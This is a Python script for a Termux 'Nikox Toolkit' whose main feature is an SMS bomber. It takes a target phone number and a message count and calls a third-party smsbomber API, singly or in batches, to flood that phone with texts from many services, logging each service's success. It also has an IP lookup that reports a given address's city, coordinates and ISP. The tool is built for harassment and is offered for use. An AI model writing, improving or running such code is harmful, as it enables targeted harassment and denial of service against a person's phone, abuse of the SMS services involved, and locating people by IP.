#!/usr/bin/env python3
"""
nikox_smsbomber_full.py (edited)

- Prompts for mode/color/save-CSV removed and replaced by automatic defaults.
- Rainbow UI added (per-character RGB gradient that shifts over time).
- Change DEFAULT_* constants at top to modify behavior.
"""

import requests
import threading
import time
import os
import sys
import signal
import csv
import json
import subprocess
import math
from datetime import datetime
from typing import Tuple

# ----------------- color init -----------------
try:
    # colorama used for Windows/ConPTY translation of ANSI sequences
    from colorama import init as colorama_init, Style
    colorama_init()  # convert ANSI on Windows terminals that support it
    C_RESET = Style.RESET_ALL
except Exception:
    C_RESET = "\x1b[0m"

# Simple named color fallbacks (still using ANSI truecolor for the rainbow)
C_OK = "\x1b[38;2;0;200;80m"
C_WARN = "\x1b[38;2;230;190;0m"
C_ERR = "\x1b[38;2;220;40;40m"
C_INFO = "\x1b[38;2;0;180;220m"

# -------- CONFIG: change these defaults if you want different automatic behavior --------
API_URL = "https://haji-mix-api.gleeze.com/api/smsbomber"
IPAPI_URL = "https://ipapi.co"
API_TIMEOUT = 60 * 60            # 1 hour
POLL_INTERVAL = 5                # seconds between elapsed prints
ADMIN_CODE = "2025"
LOG_JSON_FILE = "nikox_sms_log.json"
LOG_CSV_FILE = "nikox_sms_log.csv"
GENERAL_LOG = "nikox-log.txt"

# Default automatic mode choices (no prompts)
DEFAULT_MODE = "single"      # "single" or "multi"
DEFAULT_SAVE_CSV = False
DEFAULT_BATCHES = 3          # only used when DEFAULT_MODE == "multi"
DEFAULT_PER_BATCH_DELAY = 0.5

stopped = False

def now_str():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def append_general_log(text: str):
    try:
        with open(GENERAL_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{now_str()}] {text}\n")
    except Exception:
        pass

def vibrate_termux():
    try:
        subprocess.run(["termux-vibrate", "-d", "150"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        # ignore if not available
        pass

def safe_print(s: str = "", color_prefix: str = ""):
    """ Print with optional ANSI prefix (color_prefix). Always append reset. """
    try:
        if color_prefix:
            print(f"{color_prefix}{s}{C_RESET}")
        else:
            print(s)
    except Exception:
        print(s)

def handle_sigint(signum, frame):
    global stopped
    safe_print("\n" + C_WARN + "🛑 Interrupted. Exiting..." + C_RESET)
    stopped = True
    sys.exit(0)

signal.signal(signal.SIGINT, handle_sigint)

# ----------------- Rainbow RGB utilities -----------------

def rgb_escape(r: int, g: int, b: int) -> str:
    """Return truecolor ANSI escape for foreground."""
    return f"\x1b[38;2;{r};{g};{b}m"

def hsv_to_rgb(h: float, s: float, v: float) -> Tuple[int,int,int]:
    """Convert HSV (h in [0,1]) to RGB 0-255."""
    if s == 0.0:
        r = g = b = int(v * 255)
        return r, g, b
    i = int(h * 6.0)  # sector 0..5
    f = (h * 6.0) - i
    p = v * (1.0 - s)
    q = v * (1.0 - s * f)
    t = v * (1.0 - s * (1.0 - f))
    i = i % 6
    if i == 0:
        r_f, g_f, b_f = v, t, p
    elif i == 1:
        r_f, g_f, b_f = q, v, p
    elif i == 2:
        r_f, g_f, b_f = p, v, t
    elif i == 3:
        r_f, g_f, b_f = p, q, v
    elif i == 4:
        r_f, g_f, b_f = t, p, v
    else:
        r_f, g_f, b_f = v, p, q
    return int(r_f * 255), int(g_f * 255), int(b_f * 255)

def rainbow_text(text: str, phase: float = None, spread: float = 0.30, saturation: float = 0.9, value: float = 0.95) -> str:
    """
    Return text wrapped with per-character truecolor ANSI escapes forming a gradient.
    phase: optional float to shift gradient (use time.time() * speed for animation)
    spread: how quickly hue changes across characters (larger -> faster color changes)
    """
    if phase is None:
        phase = time.time() * 0.35  # animate by default (speed)
    out = []
    visible_len = len(text)
    if visible_len == 0:
        return text
    for i, ch in enumerate(text):
        if ch == "\n":
            out.append(ch)
            continue
        # hue cycles across characters plus a time-based phase
        frac = (i / max(1, visible_len - 1))  # 0..1 across the string
        hue = (frac * spread + phase) % 1.0
        r, g, b = hsv_to_rgb(hue, saturation, value)
        out.append(f"{rgb_escape(r, g, b)}{ch}")
    out.append(C_RESET)
    return "".join(out)

def rainbow_print(s: str):
    safe_print(rainbow_text(s))

# --- Networking helper: threaded GET with elapsed indicator ---

def threaded_get(url: str, params: dict = None, timeout: int = API_TIMEOUT, poll_interval: int = POLL_INTERVAL) -> Tuple[bool, object, int]:
    """ Performs requests.get(url, params=params, timeout=timeout) in a background thread while printing elapsed time every poll_interval seconds.
        Returns tuple: (success (bool), response_or_exception, elapsed_seconds) """
    result = {"resp": None, "exc": None, "done": False}
    def target():
        try:
            r = requests.get(url, params=params, timeout=timeout)
            result["resp"] = r
        except Exception as e:
            result["exc"] = e
        finally:
            result["done"] = True

    thread = threading.Thread(target=target, daemon=True)
    start = time.time()
    thread.start()
    next_report = start + poll_interval
    while True:
        now = time.time()
        elapsed = int(now - start)
        if result["done"]:
            return (result["exc"] is None, result["resp"] if result["exc"] is None else result["exc"], elapsed)
        if now >= start + timeout:
            return (False, TimeoutError(f"timeout of {timeout}s exceeded"), elapsed)
        if now >= next_report:
            hh = elapsed // 3600
            mm = (elapsed % 3600) // 60
            ss = elapsed % 60
            safe_print(f"⏳ Waiting for API response... elapsed {hh:02d}:{mm:02d}:{ss:02d} (will timeout after 01:00:00)", C_INFO)
            next_report += poll_interval
        time.sleep(0.2)

# --- Output helpers ---

def pretty_print_service_line(svc_name: str, success: int, failed: int, batch_idx: int = None, batch_total: int = None):
    if batch_idx is not None and batch_total is not None:
        safe_print(f"[Batch {batch_idx}/{batch_total}] {svc_name:<15}   {C_OK}✅ {success:<3}{C_RESET}   {C_ERR}❌ {failed:<3}{C_RESET}")
    else:
        safe_print(f"{svc_name:<15}   {C_OK}✅ {success:<3}{C_RESET}   {C_ERR}❌ {failed:<3}{C_RESET}")

def write_json_log(entry: dict):
    try:
        with open(LOG_JSON_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    except Exception:
        pass

def write_csv_header_if_needed():
    if not os.path.exists(LOG_CSV_FILE):
        try:
            with open(LOG_CSV_FILE, "w", newline="", encoding="utf-8") as csvfile:
                writer = csv.writer(csvfile)
                writer.writerow(["timestamp", "mode", "phone", "amount", "batch_index", "batch_total", "service", "service_success", "service_failed", "total_success", "total_failed"])
        except Exception:
            pass

def append_csv_row(row):
    try:
        with open(LOG_CSV_FILE, "a", newline="", encoding="utf-8") as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(row)
    except Exception:
        pass

# --- Core logic: single-call and multi-batch modes ---

def run_single_call(phone: str, amount: int, save_csv: bool = DEFAULT_SAVE_CSV):
    """ Call the API once with ?phone=...&amount=... and display the provider's breakdown. """
    safe_print("\n" + C_INFO + f"📡 Calling API once for {phone} amount={amount}" + C_RESET)
    params = {"phone": phone, "amount": amount}
    ok, resp_or_exc, elapsed = threaded_get(API_URL, params=params, timeout=API_TIMEOUT)
    timestamp = now_str()
    if not ok:
        safe_print(f"{C_ERR}❌ Request failed: {resp_or_exc} (waited {elapsed}s){C_RESET}")
        append_general_log(f"Single-call error for {phone}: {resp_or_exc}")
        return
    resp = resp_or_exc
    try:
        body = resp.json() if resp.content else {}
    except Exception:
        body = {}
    write_json_log({"timestamp": timestamp, "mode": "single", "phone": phone, "amount": amount, "elapsed": elapsed, "response": body})
    append_general_log(f"Single-call response for {phone}: status={body.get('status')}")
    safe_print(f"{C_OK}✅ API message: {body.get('message','(no message)')}  (waited {elapsed}s){C_RESET}")
    if isinstance(body, dict):
        details = body.get("details", {}) or {}
        total_success = details.get("total_success")
        total_failed = details.get("total_failed")
        if total_success is not None or total_failed is not None:
            safe_print(f"{C_OK}Total success:{C_RESET} {total_success}   {C_ERR}Total failed:{C_RESET} {total_failed}")
        services = details.get("services", {}) or {}
        if services:
            safe_print("\n🔎 Per-service results:")
            for svc, info in services.items():
                s = info.get("success", 0)
                f = info.get("failed", 0)
                pretty_print_service_line(svc, s, f)
                if save_csv:
                    write_csv_header_if_needed()
                    append_csv_row([timestamp, "single", phone, amount, "", "", svc, s, f, total_success, total_failed])
    else:
        safe_print(f"{C_WARN}⚠️ Unexpected response format: {body}{C_RESET}")

def run_multi_batch(phone: str, amount: int, batches: int = DEFAULT_BATCHES, save_csv: bool = DEFAULT_SAVE_CSV, per_batch_delay: float = DEFAULT_PER_BATCH_DELAY):
    """ Perform `batches` API calls. For each response print a batch summary and optionally append CSV/JSON logs. """
    safe_print("\n" + C_INFO + f"📡 Running multi-batch mode: {batches} calls for {phone} amount={amount}" + C_RESET)
    total_success_agg = 0
    total_failed_agg = 0
    timestamp_run = now_str()
    write_csv_header_if_needed()

    for i in range(1, batches + 1):
        if stopped:
            return
        safe_print("\n" + C_INFO + f"➡️  [Batch {i}/{batches}] Calling API..." + C_RESET)
        params = {"phone": phone, "amount": amount}
        ok, resp_or_exc, elapsed = threaded_get(API_URL, params=params, timeout=API_TIMEOUT)
        if not ok:
            safe_print(f"{C_ERR}❌ Batch {i} failed: {resp_or_exc} (waited {elapsed}s){C_RESET}")
            append_general_log(f"Batch {i} error for {phone}: {resp_or_exc}")
            write_json_log({"timestamp": now_str(), "mode": "batch", "batch": i, "phone": phone, "amount": amount, "elapsed": elapsed, "error": str(resp_or_exc)})
            continue

        resp = resp_or_exc
        try:
            body = resp.json() if resp.content else {}
        except Exception:
            body = {}

        write_json_log({"timestamp": now_str(), "mode": "batch", "batch": i, "phone": phone, "amount": amount, "elapsed": elapsed, "response": body})
        append_general_log(f"Batch {i} response for {phone}: status={body.get('status')}")

        if not isinstance(body, dict) or body.get("status") is not True:
            safe_print(f"{C_WARN}❗ API returned non-success or unexpected body for batch {i}:{C_RESET} {body}")
            details = (body.get("details") or {}) if isinstance(body, dict) else {}
            total_success = details.get("total_success", 0)
            total_failed = details.get("total_failed", 0)
            total_success_agg += total_success if isinstance(total_success, int) else 0
            total_failed_agg += total_failed if isinstance(total_failed, int) else 0
            if save_csv:
                services = details.get("services", {}) or {}
                if services:
                    for svc, info in services.items():
                        s = info.get("success", 0)
                        f = info.get("failed", 0)
                        append_csv_row([now_str(), "multi", phone, amount, i, batches, svc, s, f, total_success, total_failed])
            continue

        details = body.get("details", {}) or {}
        total_success = details.get("total_success", 0)
        total_failed = details.get("total_failed", 0)
        total_success_agg += total_success
        total_failed_agg += total_failed

        services = details.get("services", {}) or {}
        if services:
            svc_names = list(services.keys())
            for svc in svc_names:
                s = services[svc].get("success", 0)
                f = services[svc].get("failed", 0)
                pretty_print_service_line(svc, s, f, batch_idx=i, batch_total=batches)
                if save_csv:
                    append_csv_row([now_str(), "multi", phone, amount, i, batches, svc, s, f, total_success, total_failed])
                time.sleep(per_batch_delay)
        else:
            safe_print(f"[Batch {i}/{batches}]  {C_OK}✅ success:{total_success}{C_RESET}   {C_ERR}❌ failed:{total_failed}{C_RESET}")
            if save_csv:
                append_csv_row([now_str(), "multi", phone, amount, i, batches, "", "", "", total_success, total_failed])

        time.sleep(max(0.2, per_batch_delay))

    safe_print("\n" + C_OK + "🎯 Final aggregated result across batches:" + C_RESET)
    safe_print(f"{C_OK}✅ Total success (agg):{C_RESET} {total_success_agg}")
    safe_print(f"{C_ERR}❌ Total failed  (agg):{C_RESET} {total_failed_agg}")
    append_general_log(f"Multi-batch finished for {phone}: success={total_success_agg} failed={total_failed_agg}")

# --- IP logger (same as before) ---

def threaded_get_simple(url: str, timeout: int = API_TIMEOUT) -> Tuple[bool, object, int]:
    return threaded_get(url, params=None, timeout=timeout)

def ip_logger():
    safe_print("\n" + C_INFO + "IP Logger (ipapi.co)" + C_RESET)
    target = input("Enter IP (or leave blank for own): ").strip()
    url = f"{IPAPI_URL}/{target}/json/" if target else f"{IPAPI_URL}/json/"
    ok, resp_or_exc, elapsed = threaded_get(url, params=None, timeout=API_TIMEOUT)
    if not ok:
        safe_print(f"{C_ERR}❌ Lookup failed: {resp_or_exc} (waited {elapsed}s){C_RESET}")
        append_general_log(f"IP lookup error: {resp_or_exc}")
    else:
        resp = resp_or_exc
        try:
            data = resp.json() if resp.content else {}
        except Exception:
            data = {}
        if data.get("error"):
            safe_print(f"{C_ERR}❌ Lookup failed: {data.get('reason','Unknown API error')} (waited {elapsed}s){C_RESET}")
            append_general_log(f"IP lookup failed: {data.get('reason')}")
        else:
            safe_print(f"\n📌 IP: {data.get('ip','N/A')}")
            safe_print(f"🏙️ City: {data.get('city','N/A')}")
            safe_print(f"🌍 Region: {data.get('region','N/A')}")
            safe_print(f"🌐 Country: {data.get('country_name','N/A')} ({data.get('country','N/A')})")
            safe_print(f"📍 Location: {data.get('latitude','N/A')}, {data.get('longitude','N/A')}")
            safe_print(f"🔌 ISP: {data.get('org','N/A')}")
            append_general_log(f"IP lookup: {data.get('ip')} {data.get('city')}, {data.get('country_name')}")

# --- UI / Menu with rainbow title and animated-ish shimmer ---

def clear_screen():
    try:
        os.system("clear" if os.name != "nt" else "cls")
    except Exception:
        pass

def show_about():
    clear_screen()
    safe_print("\n" + C_INFO + "ABOUT — Nikox Toolkit CLI" + C_RESET)
    safe_print("📦 Tool Name : Nikox Toolkit v1.0")
    safe_print("👨‍💻 Developer : Angel Nico Igdalino")
    safe_print("🌐 GitHub    : https://github.com/Nikox24")
    safe_print("📱 Platform  : Termux (Node.js / Python)")
    safe_print("\nFEATURES: SMS Bomber (single/multi), IP Logger, CSV/JSON logs, colored output")
    input("\n⏎ Press Enter to return to menu...")

def render_title_box():
    # Box contents
    width = 52
    top = "╔" + "═" * width + "╗"
    middle = "║" + " " * 14 + "NIKOX TOOLKIT v1.0 (CLI)" + " " * 14 + "║"
    bottom = "╚" + "═" * width + "╝"
    # Use a phase that depends on time so each redraw appears shifted
    phase = time.time() * 0.22
    return "\n".join([rainbow_text(top, phase=phase),
                      rainbow_text(middle, phase=phase + 0.08),
                      rainbow_text(bottom, phase=phase + 0.16)])

def main_menu():
    while True:
        if stopped:
            return
        clear_screen()
        # Print animated title (recomputed each loop so it shifts)
        title = render_title_box()
        print(title)
        # menu lines rainbowified too, each with slightly different phase so they shimmer
        now_phase = time.time() * 0.28
        safe_print(rainbow_text("[1] SMS Bomber", phase=now_phase + 0.02))
        safe_print(rainbow_text("[2] IP Logger", phase=now_phase + 0.08))
        safe_print(rainbow_text("[3] About", phase=now_phase + 0.14))
        safe_print(rainbow_text("[0] Exit", phase=now_phase + 0.20))
        safe_print("")  # spacer
        choice = input(rainbow_text("👉 Choose an option: ", phase=time.time() * 0.45)).strip()
        if choice == "1":
            admin = input("🔐 Admin Code Required: ").strip()
            if admin != ADMIN_CODE:
                safe_print(C_ERR + "❌ Access denied." + C_RESET)
                time.sleep(1)
                continue
            # Gather SMS prefs (only the essentials)
            phone = input("Enter target phone (e.g. 09813933063): ").strip()
            try:
                amount = int(input("Enter amount per call (e.g. 10): ").strip())
            except Exception:
                safe_print(C_ERR + "❌ Invalid amount." + C_RESET)
                time.sleep(1)
                continue
            # AUTOMATIC MODE: no prompts shown — uses DEFAULT_MODE, DEFAULT_SAVE_CSV
            mode = DEFAULT_MODE
            save_csv = DEFAULT_SAVE_CSV
            if mode == "single":
                run_single_call(phone, amount, save_csv=save_csv)
                input("\n⏎ Press Enter to return to menu...")
            else:
                batches = DEFAULT_BATCHES
                run_multi_batch(phone, amount, batches, save_csv=save_csv, per_batch_delay=DEFAULT_PER_BATCH_DELAY)
                input("\n⏎ Press Enter to return to menu...")
        elif choice == "2":
            ip_logger()
            input("\n⏎ Press Enter to return to menu...")
        elif choice == "3":
            show_about()
        elif choice == "0":
            safe_print(C_INFO + "👋 Exiting..." + C_RESET)
            sys.exit(0)
        else:
            safe_print(C_WARN + "❌ Invalid option." + C_RESET)
            time.sleep(1)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        handle_sigint(None, None)
